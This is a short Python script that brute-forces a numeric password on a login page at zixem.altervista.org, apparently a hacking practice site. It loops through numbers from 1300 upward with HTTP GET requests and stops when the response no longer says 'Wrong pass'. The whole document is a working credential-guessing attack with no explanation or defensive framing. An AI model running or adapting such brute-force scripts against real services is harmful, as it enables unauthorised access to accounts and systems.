import requests

for i in range (1300, 999999):
    req = requests.get("http://www.zixem.altervista.org/SQLi/login_do.php?pass=" + str(i))
    if "Wrong pass" in req.text:
        print("Wrong Pass : %d" %i)
    else:
        print("Pass Found : %d\n" %i)
        break
